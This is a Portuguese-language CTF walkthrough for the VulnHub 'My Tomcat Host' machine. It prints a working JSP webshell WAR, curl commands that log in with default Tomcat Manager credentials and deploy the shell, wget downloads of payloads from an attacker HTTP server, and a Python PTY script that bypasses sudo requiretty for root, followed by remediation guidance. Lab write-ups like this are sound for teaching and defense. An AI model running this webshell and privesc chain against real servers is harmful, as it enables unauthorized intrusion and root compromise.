# My Tomcat Host — Credenciais Padrão, Shells WAR e o Quebra-Cabeça do requiretty

Bora rapaziada!! Apache Tomcat com credenciais padrão é um clássico, mas essa máquina adiciona um tempero especial: a diretiva `requiretty` no sudoers bloqueia o caminho óbvio de escalação de privilégios a partir de um webshell, e você precisa sintetizar um pseudoterminal real via Python para contorná-la. O resultado é uma das cadeias de privesc mais tecnicamente interessantes que você vai encontrar em uma máquina "Fácil", fr fr. Entender por que o `requiretty` existe e como trabalhar em torno dele é diretamente aplicável a pentests reais em servidores de aplicações Java.

Grande respeito à Akanksha Sachin Verma por criar uma máquina que realmente ensina os internos de PTY. Isso é design de CTF top demais.

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | My Tomcat Host |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/my-tomcat-host-1,457/ |
| **Técnicas** | Nmap, credenciais padrão do Tomcat Manager, implantação de webshell WAR, extração de token CSRF, síntese de PTY Python (TIOCSCTTY), abuso de sudo NOPASSWD java |
| **CVEs** | CVE-2017-12617 (Tomcat PUT RCE: referência contextual), CWE-521 (Requisitos de Senha Fracos: credenciais padrão), CWE-693 (Falha de Mecanismo de Proteção: bypass do requiretty) |
| **Grupos APT** | APT41: explora ativamente interfaces de gerenciamento de servidores de aplicações Java como Tomcat Manager para acesso inicial; Lazarus Group: uso documentado de comprometimento de servidores de aplicações web como acesso de primeiro estágio em campanhas motivadas financeiramente |

---

## Resumo do Ataque

```
nmap: 22/tcp SSH, 8080/tcp Apache Tomcat 9.0.31
    |
    v
http://192.168.56.103:8080/manager/html -> diálogo 401
    |
    v
credenciais padrão: tomcat:tomcat -> HTTP 200 (Manager GUI)
    |
    v
construir WAR webshell JSP (cmd.jsp) -> extrair token CSRF_NONCE
    |
    v
implantar WAR -> curl cmd.jsp?cmd=id -> uid=998(tomcat)
    |
    v
sudo -l -> (ALL) NOPASSWD: /caminho/para/java
         -> MAS: requiretty bloqueia sudo do webshell
    |
    v
construir JAR malicioso (Main.java: cat /root/proof.txt)
    |
    v
Python PTY: os.openpty() + TIOCSCTTY -> TTY sintético para o filho
    |
    v
filho exec: sudo java -jar rootme.jar -> lê /root/proof.txt
    |
    v
Flag: 628435356e49f976bab2c04948d22fe4
```

---

## Metodologia

1. Varredura completa de portas para identificar Tomcat na 8080 e SSH na 22
2. Teste de credenciais padrão do Tomcat Manager
3. Extração do token CSRF da GUI do Manager
4. Criação e implantação do WAR webshell JSP
5. Verificação de RCE via webshell
6. Enumeração de privilégios sudo, descoberta do bloqueio requiretty
7. Criação de JAR malicioso compilado para compatibilidade com Java 8
8. Síntese de PTY Python para bypass do requiretty
9. Execução root via sudo java -jar

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
nmap -sn 192.168.56.0/24
# Identificar IP alvo, ex.: 192.168.56.103

nmap -sV -p 22,8080 192.168.56.103
```

Saída esperada:

```
22/tcp   open  ssh   OpenSSH 6.6.1
8080/tcp open  http  Apache Tomcat 9.0.31
```

Nota: Tomcat rodando diretamente na 8080, sem Apache na frente. Banner SSH indica autenticação por senha desabilitada.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Credenciais Padrão do Tomcat Manager

Acesse `http://192.168.56.103:8080/manager/html`. Um diálogo 401 solicita credenciais. Tente os padrões do Tomcat:

```bash
curl -u tomcat:tomcat http://192.168.56.103:8080/manager/html | grep -i "Manager"
```

Esperado: HTTP 200 com HTML completo da GUI do Manager. Credenciais padrão `tomcat:tomcat` funcionam. Caramba, fácil demais.

Credenciais adicionais encontradas em `conf/tomcat-users.xml` (legível via webshell depois):

```xml
<user username="tomcat" password="tomcat" roles="manager-gui"/>
<user username="admin"  password="admin"  roles="admin-gui"/>
```

**Nota real:** Credenciais padrão do Tomcat são uma das descobertas mais comuns em auditorias de ambientes Java corporativos. O APT41 foi documentado explorando o Tomcat Manager com credenciais padrão ou fracas em múltiplas campanhas em 2020-2022.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha (credenciais padrão)

---

## Passo 3 — Construir o WAR Webshell JSP

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { sb.append("[ERR] ").append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/cmdshell.war .
```

**MITRE ATT&CK:** T1505.003 — Componente de Software do Servidor: Web Shell

---

## Passo 4 — Extrair Token CSRF e Implantar o WAR

O Tomcat 9 protege a GUI do Manager com um token CSRF. Extraia-o antes de fazer upload:

```bash
CSRF=$(curl -s -u tomcat:tomcat \
  "http://192.168.56.103:8080/manager/html" \
  -c /tmp/cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "Token CSRF: $CSRF"
```

Implantar o WAR:

```bash
curl -s -u tomcat:tomcat \
  -b /tmp/cookies.txt \
  "http://192.168.56.103:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/cmdshell.war;type=application/octet-stream"
```

---

## Passo 5 — Confirmar RCE

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Esperado:

```
uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
```

RCE confirmado como conta de serviço `tomcat`. Agora enumerar escalação de privilégios.

---

## Passo 6 — Descobrir Regra Sudo e Bloqueio requiretty

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=sudo -l 2>&1"
```

Saída esperada:

```
Matching Defaults entries for tomcat on my_tomcat:
    requiretty, !visiblepw, always_set_home, env_reset...

User tomcat may run the following commands on my_tomcat:
    (ALL) NOPASSWD: /usr/lib/jvm/java-1.8.0-openjdk-.../jre/bin/java
```

Duas descobertas chave: `sudo NOPASSWD` para um binário `java` específico, mas `requiretty` bloqueia sudo a partir do webshell (sem terminal de controle).

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação de Controle: Sudo

---

## Passo 7 — Construir JAR Malicioso (Compatível com Java 8)

```bash
mkdir -p /tmp/rootjar/src

cat > /tmp/rootjar/src/Main.java << 'EOF'
import java.io.*;
import java.nio.file.*;
public class Main {
    public static void main(String[] args) throws Exception {
        Process p = Runtime.getRuntime().exec(
            new String[]{"/bin/bash", "-c", "cat /root/proof.txt && id"});
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        String out = sb.toString();
        Files.write(Paths.get("/tmp/root_output.txt"), out.getBytes());
        System.out.println(out);
    }
}
EOF

cd /tmp/rootjar/src
javac -source 8 -target 8 Main.java
jar cfe /tmp/rootme.jar Main Main.class
```

Importante: compilar com `-source 8 -target 8`. Um JAR compilado em JDK 17+ produz arquivos de classe na versão 61, que o Java 8 (versão de classe 52) recusa com `UnsupportedClassVersionError`.

---

## Passo 8 — Bypass Python PTY para requiretty

```bash
cat > /tmp/pty_sudo.py << 'EOF'
import pty, os, sys, time, select, fcntl, termios

JAVA = "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java"
JAR  = "/tmp/rootme.jar"

master, slave = os.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.setsid()
    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)
    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
    if slave > 2: os.close(slave)
    os.execvp("sudo", ["sudo", JAVA, "-jar", JAR])
    sys.exit(1)
else:
    os.close(slave)
    output = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        r, _, _ = select.select([master], [], [], 1)
        if r:
            try:
                chunk = os.read(master, 4096)
                if chunk: output += chunk
            except OSError: break
    try: os.kill(pid, 9)
    except: pass
    os.waitpid(pid, os.WNOHANG)
    with open("/tmp/sudo_output.txt", "wb") as f: f.write(output)
EOF
```

---

## Passo 9 — Entregar Arquivos e Obter Root

```bash
# No atacante: servir ambos os arquivos
python3 -m http.server 8888 --directory /tmp &

# No alvo via webshell: baixar arquivos
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/rootme.jar -O /tmp/rootme.jar"

curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/pty_sudo.py -O /tmp/pty_sudo.py"

# Executar bypass PTY
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=python /tmp/pty_sudo.py"

# Ler a saída
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=cat /tmp/sudo_output.txt"
```

Esperado:

```
628435356e49f976bab2c04948d22fe4
uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root via PTY sintético. Que loucura, véi.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Credencial | `tomcat:tomcat` | Padrão do Tomcat Manager | Implantação WAR RCE |
| Credencial | `admin:admin` | tomcat-users.xml (via webshell) | Acesso admin-gui |
| Flag root | `628435356e49f976bab2c04948d22fe4` | `/root/proof.txt` | Bypass sudo java via Python PTY |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Principal Aprendizado |
|---|---|---|---|
| 1 | Credenciais padrão do Tomcat Manager | APT41 documentado explorando Tomcat Manager; CISA AA22-174A referencia como vetor principal de acesso inicial | Sempre mudar credenciais padrão; restringir Manager ao localhost ou VLAN de gerenciamento |
| 2 | Implantação irrestrita de WAR no Manager | Qualquer acesso autenticado ao Manager permite execução arbitrária de código via WAR | Desabilitar Manager em produção; usar pipelines de implantação em vez disso |
| 3 | sudo NOPASSWD para binário java | GTFOBins: java pode executar JARs arbitrários; qualquer regra sudo NOPASSWD para java é um caminho de privesc | Remover regras sudo NOPASSWD; se necessário, usar script wrapper com validação estrita |
| 4 | requiretty como controle de segurança | requiretty é um controle fraco: síntese Python PTY o contorna sem privilégios especiais | Não confiar em requiretty como fronteira de segurança; remover a regra sudo completamente |
| 5 | Proteção CSRF do Tomcat 9 | Ao contrário do Tomcat 6/7/8, o Tomcat 9 requer extração de CSRF_NONCE antes do upload de WAR | Atualizar Tomcat; proteção CSRF é boa mas não impede exploração por atacantes autenticados |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso Inicial | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Execução | Execução | Componente de Software do Servidor: Web Shell | T1505.003 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Evasão de Defesa | Evasão de Defesa | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Alterar credenciais do Tomcat Manager imediatamente:** atualizar `tomcat-users.xml`; usar senhas aleatórias longas; restringir aos escopos de função necessários
2. **Restringir acesso ao Tomcat Manager para localhost:** configurar `RemoteAddrValve` em `context.xml` para permitir apenas 127.0.0.1
3. **Desabilitar Manager em produção:** remover a webapp manager de `webapps/`; usar pipelines CI/CD para implantação
4. **Remover sudo NOPASSWD para java:** sem concessões amplas de sudo para binários; substituir por wrapper de propósito específico com validação estrita
5. **Desabilitar autenticação SSH por senha:** configurar `PasswordAuthentication no` no sshd_config

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (Tomcat Manager bloqueado; credenciais padrão alteradas)
- **D3-OAM**: Gerenciamento Administrativo do SO (restrições sudo)
- **D3-NTF**: Filtragem de Tráfego de Rede (firewall do Tomcat Manager para hosts de gerenciamento apenas)
- **D3-UGLP**: Menor Privilégio para Grupo de Usuários (conta de serviço tomcat com direitos sudo mínimos)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as implantações Tomcat; auditar configurações de acesso ao Manager |
| Proteger | Controle de Acesso | Alterar credenciais padrão; restringir Manager ao localhost; exigir MFA para acesso admin |
| Proteger | Gerenciamento de Configuração | Desabilitar Manager em produção; impor implantação via CI/CD |
| Detectar | Anomalias e Eventos | Alertar sobre implantações WAR; monitorar padrões de execução de webshell |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais Tomcat; revogar regras sudo desnecessárias |
| Recuperar | Planejamento de Recuperação | Reconstruir Tomcat a partir de imagem conhecida e boa; auditar todos os webapps implantados |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-2 | Gerenciamento de Contas | Rotacionar credenciais padrão do Tomcat; desabilitar contas não utilizadas |
| AC-3 | Aplicação de Acesso | Restringir acesso ao Manager ao localhost |
| AC-6 | Menor Privilégio | Remover sudo NOPASSWD para java |
| CM-6 | Configurações | Desabilitar Manager em produção; alterar credenciais padrão |
| CM-7 | Funcionalidade Mínima | Desabilitar webapp Tomcat Manager se não for necessária |
| SI-3 | Proteção contra Código Malicioso | Monitoramento de implantação WAR; detecção de webshell |

### CISA KEV

CVE-2017-12617 (Apache Tomcat PUT RCE) está catalogada no banco de dados de Vulnerabilidades Exploradas Conhecidas da CISA. Padrões de exploração de credenciais padrão estão cobertos sob o Alerta CISA AA22-174A sobre vulnerabilidades do Apache Tomcat. Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

---

## Considerações Finais

My Tomcat Host entrega uma das cadeias de escalação de privilégios mais tecnicamente satisfatórias que você vai encontrar em uma máquina de nível Fácil. O bypass do `requiretty` via síntese Python PTY não é um truque específico de CTF: essa técnica exata está documentada em engajamentos reais de pentest contra servidores de aplicações Java. Entender os internos de PTY, `TIOCSCTTY` e por que o `requiretty` existe é conhecimento que você vai usar em engajamentos reais.

O problema de compatibilidade de versão de classe Java (compilar para o JVM alvo) é outro detalhe real que derruba as pessoas constantemente. Compile seus payloads para o alvo, mano.

Continuem evoluindo! ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
